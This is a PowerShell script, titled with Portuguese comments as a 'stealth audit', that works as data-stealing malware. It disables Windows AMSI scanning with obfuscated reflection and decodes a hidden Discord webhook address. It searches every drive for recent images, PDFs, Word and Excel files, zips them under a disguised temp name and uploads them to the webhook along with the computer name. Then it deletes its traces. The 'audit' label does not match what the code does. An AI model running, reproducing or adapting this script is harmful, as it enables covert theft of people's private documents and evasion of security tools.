# [V28: Auditoria Stealth - AMSI & Telemetria]
try {
    # Bypass AMSI via reconstrução de string fragmentada
    $n = ("System.Management.Automation." + "Amsi" + "Utils")
    $t = [Ref].Assembly.GetType($n)
    $f = $t.GetField(("am" + "siInit" + "Failed"), "NonPublic,Static")
    $f.SetValue($null, $true)

    # Configuração de Segurança de Rede
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
    $u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))

    # Início da Operação
    $id = Get-Random -Minimum 1000 -Maximum 9999
    curl.exe -k -s -F "content=🟢 V28 Ativo [$id] em $env:COMPUTERNAME" $u

    $tempDir = Join-Path $env:TEMP ("cache_" + $id)
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    # Procura Otimizada (Prioridade: Documentos e Imagens recentes)
    $e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
    $limit = (Get-Date).AddDays(-30)
    
    Get-PSDrive -PSProvider FileSystem | ForEach-Object {
        $r = $_.Root
        Get-ChildItem -Path $r -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
            $p = $_.FullName
            $isSys = $false; foreach($d in @("C:\Windows", "C:\Program Files")){if($p.StartsWith($d)){$isSys=$true;break}}
            !$isSys -and $_.LastWriteTime -gt $limit -and $_.Length -lt 15MB
        } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
    }

    # Exfiltração
    $zip = Join-Path $env:TEMP ("upd_" + $id + ".tmp")
    if ((Get-ChildItem $tempDir).Count -gt 0) {
        Compress-Archive -Path "$tempDir\*" -DestinationPath $zip -Force
        curl.exe -k -s -F "file=@$zip" -F "content=📦 Dados [$id]: $env:COMPUTERNAME" $u
    }
}
catch {
    $err = "🔴 Erro V28 [$id]: $($_.Exception.Message)"
    curl.exe -k -s -F "content=$err" $u
}
finally {
    if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
    if (Test-Path $zip) { Remove-Item $zip -Force }
}
